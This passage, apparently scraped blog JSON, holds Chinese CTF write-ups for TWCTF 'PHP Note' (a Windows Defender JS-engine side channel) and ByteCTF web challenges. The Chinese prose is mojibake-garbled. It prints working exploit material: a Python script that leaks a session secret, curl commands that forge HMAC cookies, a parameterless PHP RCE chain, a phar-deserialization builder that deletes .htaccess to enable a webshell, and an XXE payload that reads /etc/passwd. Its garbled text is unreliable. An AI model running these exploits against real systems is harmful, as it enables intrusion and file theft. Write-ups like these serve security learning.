·æˆ‘ä»¬ä¼¼ä¹å¯ä»¥é€šè¿‡æ˜¯å¦ç™»å½•æˆåŠŸæ¥è·å¾—$_SESSION['secret']  æˆ‘ä»¬å¯ä»¥æœ¬åœ°è¿›è¡Œæµ‹è¯•ä¸€ä¸‹ï¼Œéšä¾¿ç™»å½•ä¸€ä¸ªå‘ç° session æ–‡ä»¶å†…å®¹æ˜¯\nrealname|s:9:\u0026quot;zedd zedd\u0026quot;;nickname|s:6:\u0026quot;yoyoyo\u0026quot;;secret|s:32:\u0026quot;621e1d6607af0b500603e68b23e042e2\u0026quot;; å‘ç° secret ç«Ÿç„¶æ˜¯åœ¨æˆ‘ä»¬å¯æ§æ•°æ®çš„åé¢ï¼Œå¦‚æœæ²¡æœ‰\u0026lt;/body\u0026gt;æ ‡ç­¾é—­åˆï¼ŒWindows Defender çš„ JS Engine ä¸åƒç°ä»£æµè§ˆå™¨ä¸€æ ·å¯ä»¥é—­åˆæ ‡ç­¾ï¼Œè¿™æ ·æˆ‘ä»¬ä¹Ÿè¾¾ä¸åˆ°æˆ‘ä»¬ä¾§ä¿¡é“æ”»å‡»çš„æ•ˆæœï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªåŠæ³•è®©æˆ‘ä»¬å¯æ§çš„åœ°æ–¹åœ¨ secret æ•°æ®åé¢æ‰è¡Œã€‚\nè®©æˆ‘ä»¬å†å›é¡¾ä¸€ä¸‹ç™»å½•é€»è¾‘\nif ($action === \u0026#39;login\u0026#39;) { if ($method === \u0026#39;POST\u0026#39;) { $nickname = (string)$_POST[\u0026#39;nickname\u0026#39;]; $realname = (string)$_POST[\u0026#39;realname\u0026#39;]; if (empty($realname) || strlen($realname) \u0026lt; 8) { die(\u0026#39;invalid name\u0026#39;); } $_SESSION[\u0026#39;realname\u0026#39;] = $realname; if (!empty($nickname)) { $_SESSION[\u0026#39;nickname\u0026#39;] = $nickname; } $_SESSION[\u0026#39;secret\u0026#39;] = gen_secret($nickname); } redirect(\u0026#39;index\u0026#39;); } å…¶ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸€ä¸ª$nicknameä¸ºç©ºçš„åˆ¤æ–­ï¼Œæˆ‘ä»¬çœ‹çœ‹å½“$nicknameä¸ºç©ºçš„æ—¶å€™ç™»å½•ï¼Œsession æ–‡ä»¶ä¼šæ˜¯æ€ä¹ˆæ ·çš„ï¼š\nrealname|s:9:\u0026quot;zedd zedd\u0026quot;;secret|s:32:\u0026quot;8b9a527ff677cb223afa87dad7c9e6f8\u0026quot;; æ­¤æ—¶å¦‚æœæˆ‘ä»¬ä¸æ³¨é”€ï¼Œç›´æ¥å†æ¬¡å‘ä¸€ä¸ªå«æœ‰ nickname çš„ç™»å½•åŒ…ï¼Œçœ‹çœ‹åˆä¼šæœ‰ä»€ä¹ˆæ•ˆæœ\nrealname|s:9:\u0026quot;zedd zedd\u0026quot;;secret|s:32:\u0026quot;621e1d6607af0b500603e68b23e042e2\u0026quot;;nickname|s:6:\u0026quot;yoyoyo\u0026quot;; ï¼ï¼ï¼è¿™ç§æ•°æ®æ ¼å¼ä¸æ­£æ˜¯æˆ‘ä»¬æ‰€éœ€è¦çš„ä¾§ä¿¡é“æ”»å‡»æ ¼å¼å—ï¼è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ Windows Defender ä¾§ä¿¡é“æ”»å‡»æŠŠ secret è¯»å‡ºæ¥äº†ï¼\nåªè¦æˆ‘ä»¬æ„é€ ç±»ä¼¼å¦‚ä¸‹çš„ payload å°±å¯ä»¥äº†( x ä¸ºåºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦ä¸²é•¿åº¦)ï¼š\nrealname|s:x:\u0026quot;\u0026lt;script\u0026gt;var body = document.body.innerHTML;var mal = 'X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H;' + body[0];eval(mal);\u0026lt;/script\u0026gt;\u0026lt;body\u0026gt;\u0026quot;;secret|s:32:\u0026quot;621e1d6607af0b500603e68b23e042e2\u0026quot;;nickname|s:x:\u0026quot;\u0026lt;/body\u0026gt;\u0026quot;; æ¥ä¸‹æ¥å°±æ˜¯ä¸ä¸Šé¢ç±»ä¼¼çš„æ­¥éª¤ï¼Œåˆ©ç”¨â€œç›²æ³¨â€çš„å½¢å¼æ¥è¯» secret ï¼Œä¸‹é¢å°±è´´ä¸€ä¸‹ r3kapig å¸ˆå‚…ä»¬çš„è„šæœ¬ï¼š\nimport requests URL = \u0026#34;http://phpnote.chal.ctf.westerns.tokyo\u0026#34; # changeme def trigger(c, idx): import string p = \u0026#39;\u0026#39;\u0026#39;\u0026lt;script\u0026gt;f=function(n){eval(\u0026#39;X5O!P%@AP[4\\\\\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H\u0026#39;+{${c}:\u0026#39;*\u0026#39;}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));\u0026lt;/script\u0026gt;\u0026lt;body\u0026gt;\u0026#39;\u0026#39;\u0026#39; p = string.Template(p).substitute({\u0026#39;idx\u0026#39;: idx, \u0026#39;c\u0026#39;: c}) return p def leak(idx): l, h = 0, 0x100 while h - l \u0026gt; 1: m = (h + l) // 2 gid = trigger(m, idx) # r = requests.post(URL + \u0026#39;/?action=login\u0026#39;, data={\u0026#39;realname\u0026#39;: gid, \u0026#39;nickname\u0026#39;: \u0026#39;1\u0026#39;}) # print r.content # exit() s = requests.session() s.post(URL + \u0026#39;/?action=login\u0026#39;, data={\u0026#39;realname\u0026#39;: gid, \u0026#39;nickname\u0026#39;: \u0026#39;\u0026#39;}) if \u0026#34;/?action=login\u0026#34; in s.post(URL + \u0026#39;/?action=login\u0026#39;, data={\u0026#39;realname\u0026#39;: gid, \u0026#39;nickname\u0026#39;: \u0026#39;\u0026lt;/body\u0026gt;\u0026#39;}).content: l = m else: h = m return chr(l) data = \u0026#39;\u0026#39; for i in range(100): data += leak(i) print(data) æ‹¿åˆ° secret ä¹‹åï¼Œå°±å¯ä»¥æ„é€  Note ç±»äº†ï¼š\n\u0026lt;?php class Note { public function __construct($admin) { $this-\u0026gt;notes = array(); $this-\u0026gt;isadmin = $admin; } public function addnote($title, $body) { array_push($this-\u0026gt;notes, [$title, $body]); } public function getnotes() { return $this-\u0026gt;notes; } public function getflag() { if ($this-\u0026gt;isadmin === true) { echo FLAG; } } } function verify($data, $hmac) { $secret = $_SESSION[\u0026#39;secret\u0026#39;]; if (empty($secret)) return false; return hash_equals(hash_hmac(\u0026#39;sha256\u0026#39;, $data, $secret), $hmac); } function hmac($data) { $secret = $_SESSION[\u0026#39;secret\u0026#39;]; if (empty($data) || empty($secret)) return false; return hash_hmac(\u0026#39;sha256\u0026#39;, $data, $secret); } function gen_secret($seed) { return \u0026#34;2532bd172578d19923e5348420e02320\u0026#34;; } // create session $_SESSION = Array(); $_SESSION[\u0026#39;secret\u0026#39;] = gen_secret(\u0026#39;\u0026#39;); $_SESSION[\u0026#39;realname\u0026#39;] = \u0026#34;stypr stypr\u0026#34;; $_SESSION[\u0026#39;nickname\u0026#39;] = \u0026#34;\u0026#34;; // generate note $note = new Note(true); $note-\u0026gt;addnote(\u0026#34;work\u0026#34;, \u0026#34;work\u0026#34;); $data = base64_encode(serialize($note)); /* verify //echo \u0026#34;Data: \u0026#34;.(string)$data.\u0026#34;\\n\u0026#34;; //echo \u0026#34;HMAC: \u0026#34;.(string)hmac($data).\u0026#34;\\n\u0026#34;; //echo \u0026#34;-----\u0026#34;; //var_dump(verify((string)$data, (string)hmac($data))); */ ?\u0026gt;curl -s \u0026#39;http://phpnote.chal.ctf.westerns.tokyo/?action=logout\u0026#39; -H \u0026#39;Cookie: PHPSESSID=468b674d8d6139373a064b832efdf47a;\u0026#39; --insecure curl -s \u0026#39;http://phpnote.chal.ctf.westerns.tokyo/?action=login\u0026#39; -H \u0026#39;Cookie: PHPSESSID=468b674d8d6139373a064b832efdf47a;\u0026#39; --data \u0026#39;nickname=\u0026lt;/body\u0026gt;\u0026amp;realname=stypr+stypr\u0026#39; --compressed --insecure curl -s \u0026#34;http://phpnote.chal.ctf.westerns.tokyo/?action=getflag\u0026#34; -H \u0026#34;Cookie: PHPSESSID=468b674d8d6139373a064b832efdf47a; note=\u0026lt;?php echo $data; ?\u0026gt;; hmac=\u0026lt;?php echo hmac($data); ?\u0026gt;;\u0026#34; $ php flag.php | sh | grep \u0026#34;TWCTF\u0026#34; TWCTF{h0pefully_I_haven\u0026#39;t_made_a_m1stake_again}\u0026lt;!doctype html\u0026gt; One More å…¶å®ä¸ªäººè§‰å¾— Windows Defender è¿™ä¸ª JS Engine è¿˜æ˜¯æœ‰å¾ˆå¤šæ²¡å‘æ˜çš„åœ°æ–¹ï¼Œå¥ˆä½•è‡ªå·±é€†å‘æ°´å¹³ä¸å¤Ÿï¼Œè¿™é‡Œæ”¾å‡ ä¸ªä¼šè®®çš„åˆ†äº«å§\nWindows Offender: Reverse Engineering Windows Defender\u0026rsquo;s Antivirus Emulator\nReference Playing with Windwos Defender\nr3kapig - PHP Note\nbalsn - PHP Note\n","date":"2019-09-17T22:22:10Z","permalink":"https://blog.zeddyu.info/2019/09/17/windows-defender/","title":"Windows Defender ä¾§ä¿¡é“æ”»å‡»"},{"content":"å‘¨æœ«è‡ªå·±æ‰“äº†ä¸€ä¼š Byte CTF ï¼Œé˜Ÿé‡Œå…¶ä»–å¸ˆå‚…éƒ½æ²¡å•¥æ—¶é—´ï¼Œè‡ªå·±åšé¢˜æ¯”è¾ƒæ…¢ï¼Œå°±åªåšäº†å‡ ä¸ªé¢˜ã€‚\nWeb boring_code \u0026lt;?php function is_valid_url($url) { if (filter_var($url, FILTER_VALIDATE_URL)) { if (preg_match(\u0026#39;/data:\\/\\//i\u0026#39;, $url)) { return false; } return true; } return false; } if (isset($_POST[\u0026#39;url\u0026#39;])){ $url = $_POST[\u0026#39;url\u0026#39;]; if (is_valid_url($url)) { $r = parse_url($url); if (preg_match(\u0026#39;/baidu\\.com$/\u0026#39;, $r[\u0026#39;host\u0026#39;])) { $code = file_get_contents($url); if (\u0026#39;;\u0026#39; === preg_replace(\u0026#39;/[a-z]+\\((?R)?\\)/\u0026#39;, NULL, $code)) { if (preg_match(\u0026#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i\u0026#39;, $code)) { echo \u0026#39;bye~\u0026#39;; } else { eval($code); } } } else { echo \u0026#34;error: host not allowed\u0026#34;; } } else { echo \u0026#34;error: invalid url\u0026#34;; } }else{ highlight_file(__FILE__); } å®¡è®¡é¢˜ï¼Œç”± PHP SSRF Techniques è¿™ç¯‡æ–‡ç« æˆ‘ä»¬å¯ä»¥çŸ¥é“æœ‰å‡ ç§ bypass trickï¼Œä¸é¢˜ç›®æ¯”è¾ƒç±»ä¼¼çš„æ˜¯æœ€åä¸€ç§ trick ï¼Œä½¿ç”¨ data åè®®ç»•è¿‡è¿›è¡Œ xss\ndata://google.com/plain;base64,SSBsb3ZlIFBIUAo= ä½†æ˜¯æˆ‘ä»¬è¿™é‡Œ data ç›´æ¥è¢« ban æ‰äº†ï¼Œå°±æ²¡åŠæ³•äº†\u0026hellip;\nè¿™é‡Œæˆ‘ä»¬é˜Ÿ @rmb122 å¸ˆå‚…æ˜¯ç›´æ¥ä¹°äº†ä¸€ä¸ªåŸŸåxxxxbaidu.comè¿™æ ·ï¼Œç„¶åèµ·ä¸ª http æœåŠ¡å°±è¡Œï¼Œç„¶è€Œçœ‹äº† ROIS çš„ wp ï¼Œè¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„è§£æ³•ï¼Œå°±æ˜¯åˆ©ç”¨ç™¾åº¦çˆ¬è™«ã€‚\nåœ¨ç™¾åº¦æœç´¢ç•Œé¢å¦‚æœçˆ¬åˆ°çš„è‡ªå·±ç½‘ç«™çš„è¯ï¼Œç‚¹å‡»è‡ªå·±çš„ç½‘ç«™ï¼Œå¹¶ä¸æ˜¯ç›´æ¥è®¿é—®è‡ªå·±çš„ç½‘ç«™ï¼Œè€Œæ˜¯ç™¾åº¦æœ‰ä¸€ä¸ªé‡å®šå‘çš„æœºåˆ¶ï¼Œå°†ä½ çš„ç½‘ç«™è½¬æ¢æˆäº†ç±»ä¼¼å¦‚ä¸‹çš„å½¢å¼\nhttp://www.baidu.com/link?url=7W9evem35YiIRoQTUDMHxL5ZzKqb8nlwG_me93YTuIZLKV6l0YLOZcxWlVTdNGPQ70SncapWoM5ceZ55fUae6a æœ€ç»ˆè¿˜æ˜¯ä¼šè·³è½¬åˆ°ä½ çš„ç½‘ç«™ï¼Œä½†æ˜¯è¿™ä¸ªè¦æ±‚å°±æ˜¯éœ€è¦è®©ç™¾åº¦çš„è™«å­çˆ¬åˆ°è‡ªå·±çš„ç½‘ç«™ï¼Œç™¾åº¦çˆ¬è™«ä¸€èˆ¬æ˜¯ä¸¤ä¸‰å¤©ç”Ÿæ•ˆï¼Œæ‰€ä»¥å¦‚æœæ˜¯æ—©å°±æœ‰è‡ªå·±çš„ç«™å¹¶ä¸”è¢«ç™¾åº¦çˆ¬è™«çˆ¬äº†çš„ï¼Œæˆ–è€…åœ¨ç™¾åº¦ç«™é•¿ä¸Šæäº¤äº†çš„éƒ½å¯ä»¥é‡‡ç”¨è¿™ç§ç±»ä¼¼çš„æ–¹æ³•è¿›è¡Œç»•è¿‡ã€‚\næ¥ä¸‹æ¥ä¸€ä¸ªæ­£åˆ™/[a-z]+\\((?R)?\\)/ï¼Œå°±æ˜¯ä¸€ä¸ªæ— å‚æ•° RCE äº†ï¼Œæ„æ€å°±æ˜¯åªå…è®¸ä½¿ç”¨ç±»ä¼¼a(b(c()));è¿™ç§å½¢å¼ï¼Œå¹¶ä¸”è¿‡æ»¤äº†ä¸‹åˆ’çº¿ï¼Œå¾ˆå¤šå‡½æ•°éƒ½ä¸èƒ½ç”¨äº†ã€‚\nå†æ¥ä¸‹æ¥ä¸€ä¸ªæ­£åˆ™/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/iï¼Œå°±æ˜¯ä¸€ä¸ªç®€å•çš„å…³é”®å­—è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨get_definded_functionsæ¥å–å¾—æ‰€æœ‰å†…ç½®å¯ç”¨å‡½æ•°ï¼Œå†ç”¨è¿™ä¸ªæ­£åˆ™è¿‡æ»¤ï¼Œä¿ç•™æœ€åå‰©ä¸‹çš„å‡½æ•°ï¼Œç”¨è¿™ä¸ªå‡½æ•°ç»•è¿‡ä¸Šé¢çš„æ­£åˆ™å°±è¡Œäº†ã€‚\næ ¹æ®é¢˜ç›®æç¤ºï¼Œé¢˜ç›®çš„ Web ç›®å½•å½¢å¼å¤§è‡´æ˜¯\n. â”œâ”€â”€ code â”‚Â â””â”€â”€ index.php â””â”€â”€ index.php 1 directory, 2 files æˆ‘ä»¬è¿è¡Œçš„æºä»£ç æ˜¯åœ¨ code æ–‡ä»¶å¤¹ä¸‹ï¼Œè€Œ flag æ˜¯åœ¨ä¸ code ç›®å½•å¹³çº§çš„ index.php æ–‡ä»¶ä¸­ï¼Œæ„æ€å°±æ˜¯æˆ‘ä»¬éœ€è¦è·å¾—../index.phpçš„æºç ï¼Œæˆ‘ä»¬å¯ä»¥æ„å»ºä¸€ä¸ªç±»ä¼¼çš„ä»£ç ç¯å¢ƒæ–¹ä¾¿è°ƒè¯•ã€‚\næ‰€ä»¥ç¬¬ä¸€ä¸ªæˆ‘ä»¬æ¯”è¾ƒå®¹æ˜“æƒ³åˆ°çš„æ˜¯ç”¨scandirå‡½æ•°æ‹¿åˆ°å½“å‰ç›®å½•ï¼Œå¾—åˆ°ä¸€ä¸ªæ•°ç»„ï¼Œä½¿ç”¨chdirå‡½æ•°è·³åˆ°ä¸Šçº§ç›®å½•ï¼Œå†ç”¨readfileè¿›è¡Œè¯»å–ã€‚\né¦–å…ˆç”¨scandirå¾—åˆ°å½“å‰ç›®å½•æ•°ç»„ï¼š\nphp \u0026gt; var_dump(scandir(\u0026#39;.\u0026#39;)); array(3) { [0]=\u0026gt; string(1) \u0026#34;.\u0026#34; [1]=\u0026gt; string(2) \u0026#34;..\u0026#34; [2]=\u0026gt; string(8) \u0026#34;test.php\u0026#34; } å¯ä»¥çœ‹åˆ°..æ˜¯åœ¨ç¬¬äºŒä¸ªï¼Œä¹Ÿå°±æ˜¯æ•°ç»„çš„ array[1] ä½ç½®ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨nextå‡½æ•°è·å¾—æ•°ç»„ç¬¬äºŒä¸ªå­—ç¬¦ä¸²ã€‚\nphp \u0026gt; var_dump(next(scandir(\u0026#39;.\u0026#39;))); PHP Notice: Only variables should be passed by reference in php shell code on line 1 string(2) \u0026#34;..\u0026#34; æ¥ç€ç”¨chdirå‡½æ•°è·³åˆ°ä¸Šçº§ç›®å½•ï¼š\nphp \u0026gt; var_dump(chdir(next(scandir(\u0026#39;.\u0026#39;)))); PHP Notice: Only variables should be passed by reference in php shell code on line 1 bool(true) è™½ç„¶æœ‰ä¸€ä¸ª PHP Notice ï¼Œä½†æ˜¯ä¹Ÿè¯¯ä¼¤å¤§é›…ï¼Œè¿™é‡Œå…³é”®çš„æ˜¯chdirè¿”å›å€¼æ˜¯ä¸ªbool(true)ï¼Œå¹¶æ²¡æœ‰è¿”å›ä¸Šçº§ç›®å½•æ•°ç»„ä»€ä¹ˆçš„ï¼Œè¿™æ ·æˆ‘ä»¬è²Œä¼¼å°±ä¸èƒ½è·å–åˆ°ä¸Šçº§ç›®å½•ä¸‹çš„æ–‡ä»¶äº†ï¼Œä¹Ÿå°±ä¸èƒ½æ‹¿åˆ°æºç äº†ã€‚\næˆ‘ä»¬æš‚æ—¶å…ˆæŠ›å¼€è¿™ä¸ªé—®é¢˜ï¼Œå…ˆå‡è®¾åˆ°äº†ä¸Šçº§ç›®å½•ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥åƒä¸Šé¢çš„æ–¹æ³•ä¸€æ ·ï¼Œç”¨sandirè·å¾—æ•°ç»„æ¥è¿›ä¸€æ­¥è¯»å–æ–‡ä»¶å‘¢ï¼Ÿ\nphp \u0026gt; var_dump(scandir(\u0026#39;.\u0026#39;)); array(4) { [0]=\u0026gt; string(1) \u0026#34;.\u0026#34; [1]=\u0026gt; string(2) \u0026#34;..\u0026#34; [2]=\u0026gt; string(4) \u0026#34;code\u0026#34; [3]=\u0026gt; string(9) \u0026#34;index.php\u0026#34; } è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ç›®æ ‡æ–‡ä»¶äº†ï¼Œå› ä¸ºç›®å½•æ’åºçš„åŸå› ï¼Œ i åœ¨ c çš„åé¢ï¼Œæ‰€ä»¥æˆ‘ä»¬è‚¯å®šå¯ä»¥ç›´æ¥ç”¨endå‡½æ•°ç›´æ¥è·å–è¿™ä¸ªæ•°ç»„çš„æœ€åä¸€ä¸ªæ‹¿åˆ°index.phpå­—ç¬¦ä¸²ï¼Œ\nphp \u0026gt; var_dump(end(scandir(\u0026#39;.\u0026#39;))); PHP Notice: Only variables should be passed by reference in php shell code on line 1 string(9) \u0026#34;index.php\u0026#34; æ¥ç€æˆ‘ä»¬å°±å¯ä»¥æ„‰å¿«çš„ç”¨readfileæ¥è·å– flag äº†\nphp \u0026gt; var_dump(readfile(end(scandir(\u0026#39;.\u0026#39;)))); PHP Notice: Only variables should be passed by reference in php shell code on line 1 \u0026lt;?php $flag = \u0026#34;This is index.php! And you get flag!\u0026#34;;int(54) å‰é¢åé¢æˆ‘ä»¬éƒ½æ‰“é€šäº†ï¼Œç°åœ¨å”¯ä¸€ç¼ºçš„å°±æ˜¯å¦‚ä½•æŠŠchdirè¿”å›çš„bool(true)å˜æˆ.ä»¥ä¾¿scandirå‡½æ•°è°ƒç”¨çš„é—®é¢˜äº†ã€‚\nç»è¿‡ @rmb122 å¸ˆå‚…çš„å‘æ˜ï¼Œmicrotimeå¯ä»¥æ¥å—ä¸€ä¸ªbool(true)å‚æ•°ï¼Œå¹¶è¿”å›å½“å‰ Unix æ—¶é—´æˆ³å’Œå¾®ç§’æ•°\nphp \u0026gt; var_dump(microtime(true)); float(1568657564.377) ä¹ä¸€çœ‹æ²¡ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬ä¾ç„¶å¯ä»¥é…åˆchrå‡½æ•°æ¥è¿›è¡Œ ascii ç è½¬æ¢ï¼Œå½“æ—¶é—´åˆ°äº†æŒ‡å®šæ—¶é—´ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‹¿åˆ°.å­—ç¬¦äº†ï¼äºæ˜¯è¿™æ ·ä¸€å¼€å§‹å¦‚ä½•æ„é€ æœ€å¼€å§‹çš„.è¿™ä¸ªé—®é¢˜ä¹Ÿå¯ä»¥è§£å†³äº†ï¼\näºæ˜¯æ•´ä¸ª payload å°±æ˜¯ï¼š\nreadfile(end(scandir(chr(microtime(chdir(next(scandir(chr(time()))))))))); è¿™ä¸ªæ–¹æ³•çš„ç¼ºç‚¹ä¹Ÿæ¯”è¾ƒæ˜æ˜¾ï¼Œéœ€è¦çˆ†ç ´\u0026hellip;äºæ˜¯æˆ‘ç”¨ intruder çˆ†äº†ä¸€ä¸‹ï¼Œè¿æ°”ä¹Ÿæ¯”è¾ƒå¥½ï¼Œ5s å°±å‡ºæ¥äº†ã€‚\n \nEzCMS è¿™ä¸ªé¢˜ä¸æƒ³è¯„ä»·å¤ªå¤š\u0026hellip;æ‹¿æˆ‘å‡ºçš„ SUCTF upload labs 2 æ¥é­”æ”¹çš„é¢˜ï¼Œè¿™é‡Œå°±ç®€è¦è¯´è¯´ç‚¹ï¼Œä¸å†è¯¦ç»†èµ˜è¿°äº†ã€‚\nè¿™ä¸ªé¢˜ä¹Ÿæ˜¯ä¸ªä¸Šä¼ çš„ç¯å¢ƒï¼Œä½†æ˜¯ä¸Šä¼ æœ‰ä¸€ä¸ªé™åˆ¶ä»¥åŠè¿˜æœ‰ä¸€ä¸ªå¯ç–‘çš„__callé­”æœ¯æ–¹æ³•\nclass Profile{ public $username; public $password; public $admin; public function is_admin(){ $this-\u0026gt;username = $_SESSION[\u0026#39;username\u0026#39;]; $this-\u0026gt;password = $_SESSION[\u0026#39;password\u0026#39;]; $secret = \u0026#34;********\u0026#34;; if ($this-\u0026gt;username === \u0026#34;admin\u0026#34; \u0026amp;\u0026amp; $this-\u0026gt;password != \u0026#34;admin\u0026#34;){ if ($_COOKIE[\u0026#39;user\u0026#39;] === md5($secret.$this-\u0026gt;username.$this-\u0026gt;password)){ return 1; } } return 0; } function __call($name, $arguments) { $this-\u0026gt;admin-\u0026gt;open($this-\u0026gt;username, $this-\u0026gt;password); } } è¿™é‡Œå¯ä»¥ç”¨ hash é•¿åº¦æ‹“å±•æ¥ç»•è¿‡ï¼Œhashpump å°±è¡Œã€‚\nfunction __construct($filename, $file_tmp, $size) { $this-\u0026gt;upload_dir = \u0026#39;sandbox/\u0026#39;.md5($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); if (!file_exists($this-\u0026gt;upload_dir)){ mkdir($this-\u0026gt;upload_dir, 0777, true); } if (!is_file($this-\u0026gt;upload_dir.\u0026#39;/.htaccess\u0026#39;)){ file_put_contents($this-\u0026gt;upload_dir.\u0026#39;/.htaccess\u0026#39;, \u0026#39;lolololol, i control all\u0026#39;); } $this-\u0026gt;size = $size; $this-\u0026gt;filename = $filename; $this-\u0026gt;file_tmp = $file_tmp; $this-\u0026gt;content_check = new Check($this-\u0026gt;file_tmp); $profile = new Profile(); $this-\u0026gt;checker = $profile-\u0026gt;is_admin(); } è™½ç„¶å¯ä»¥ä¸Šä¼ ä»»æ„åç¼€çš„æ–‡ä»¶ï¼Œä½†æ˜¯ä¸Šä¼ ç›®å½•ä¸‹æœ‰è¢«æ§åˆ¶çš„.htaccessï¼Œå¯¼è‡´æˆ‘ä»¬ä¸Šä¼ çš„ php æ–‡ä»¶ä¸èƒ½è§£æï¼Œè€Œä¸”æ¯æ¬¡ç™»å½•éƒ½ä¼šç”Ÿæˆè¿™ä¸ª.htaccessæ–‡ä»¶ï¼Œä¸èƒ½è¢«ç»•è¿‡ã€‚\nclass File{ function __destruct() { if (isset($this-\u0026gt;checker)){ $this-\u0026gt;checker-\u0026gt;upload_file(); } } } æ•´ä¸ªé¢˜å”¯ä¸€ä¸€ä¸ª__destructå‡½æ•°ï¼Œä¸ç”¨çŒœå°±çŸ¥é“æ˜¯åˆ©ç”¨è¿™ä¸ªç‚¹\nclass File{ public function view_detail(){ if (preg_match(\u0026#39;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i\u0026#39;, $this-\u0026gt;filepath)){ die(\u0026#34;nonono~\u0026#34;); } $mine = mime_content_type($this-\u0026gt;filepath); $store_path = $this-\u0026gt;open($this-\u0026gt;filename, $this-\u0026gt;filepath); $res[\u0026#39;mine\u0026#39;] = $mine; $res[\u0026#39;store_path\u0026#39;] = $store_path; return $res; } } è¿™é‡Œæ˜¯ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„ phar ååºåˆ—åŒ–çš„ç‚¹ï¼Œè§¦å‘å‡½æ•°æ˜¯mime_content_typeï¼Œè§¦å‘æµæ˜¯php://filterã€‚\næ•´ä¸ªé¢˜çš„æ„æ€ä¹Ÿæ¯”è¾ƒæ˜æ˜¾ï¼Œä½†æ˜¯ä¸€å¼€å§‹ä¸æ˜¯å¾ˆ get åˆ°ç‚¹ï¼Œç»™å‡ºçš„é‚£ä¸ª__callé­”æœ¯æ–¹æ³•æœ‰ç‚¹è«åå…¶å¦™ï¼Œç„¶åä¸€ç›´å»æ—¥move_uploaded_fileæ–¹æ³•å»äº†ï¼Œç»“æœå‘ç°è¿™ä¸ªæ ¹æœ¬æ—¥ä¸åŠ¨ã€‚ç„¶åç»è¿‡é©¬å¸ˆå‚…çš„æé†’ï¼Œget äº†ä¸€ä¸ª ZipArchive::open å‡½æ•°ï¼Œç„¶åä¸€åˆ‡å°±æ˜ç™½äº†ï¼Œéšæ‰‹ä¸€æœå°±æ˜¯ä¸ªåŸé¢˜é­”æ”¹é¢˜ Insomni\u0026rsquo;hack Teaser 2018æ¯”èµ›Write Upï¼šFile Vaulté¢˜ç›®ï¼Œå¯ä»¥ä½¿ç”¨ ZipArchive-\u0026gt;open æ–¹æ³•è¾¾åˆ°åˆ é™¤ç›®æ ‡æ–‡ä»¶ã€‚\næ‰€ä»¥æ•´ä¸ªåˆ©ç”¨é“¾å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼Œ hash æ‹“å±•ç»•è¿‡ä¸Šä¼ é™åˆ¶ï¼Œä¸Šä¼ ä¸€ä¸ª webshell ï¼Œå†æ„é€ ä¸€ä¸ª ZipArchive ç±»çš„ phar åŒ…ä¸Šä¼ ï¼Œç”¨php://filter/resource=phar://è§¦å‘ phar ååºåˆ—åŒ–åˆ é™¤è‡ªå·±ç›®å½•ä¸‹çš„.htaccessæ–‡ä»¶ï¼Œç›´æ¥ getflag ã€‚\næ„é€  phar åŒ…çš„ä»£ç å¦‚ä¸‹ï¼š\n\u0026lt;?php class Check{ public $filename; function __construct($filename) { $this-\u0026gt;filename = $filename; } } class File{ public $filename; public $filepath; public $checker; } class Admin{ public $size; public $checker; public $file_tmp; public $filename; public $upload_dir; public $content_check; } class Profile{ public $username = \u0026#34;/var/www/html/sandbox/9607fe6aa978f6811eb3fe830b544771/.htaccess\u0026#34;; public $password = \u0026#34;9\u0026#34;; public $admin; } class A{ public $a = 1; } unlink(\u0026#34;1.phar\u0026#34;); $phar = new Phar(\u0026#34;1.phar\u0026#34;); //åç¼€åå¿…é¡»ä¸ºphar $phar-\u0026gt;startBuffering(); // \u0026lt;?php __HALT_COMPILER(); $phar-\u0026gt;setStub(\u0026#34;GIF89a\u0026#34; . \u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //è®¾ç½®stub $a = new ZipArchive(); $b = new Profile(); $b-\u0026gt;admin = $a; $o = new File(); $o-\u0026gt;checker = $b; $phar-\u0026gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-\u0026gt;stopBuffering(); ?\u0026gt;rss æ ¹æ®é¢˜ç›®åå­—ï¼Œå› ä¸º rss æœ¬èº«ä¹Ÿæ˜¯ä¸ª XML ï¼Œè¿™é‡Œçš„è€ƒç‚¹ä¹‹ä¸€è‚¯å®šå°±æ˜¯ xxe äº†ã€‚\näºæ˜¯ç›´æ¥æ‹¿ä¸€ä¸ª rss xxe æ¨¡ç‰ˆæ¥æ”¹ä¸€ä¸‹\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE title [ \u0026lt;!ELEMENT title ANY \u0026gt; \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34; \u0026gt;]\u0026gt; \u0026lt;rss version=\u0026#34;2.0\u0026#34; xmlns:atom=\u0026#34;http://www.w3.org/2005/Atom\u0026#34;\u0026gt; \u0026lt;channel\u0026gt; 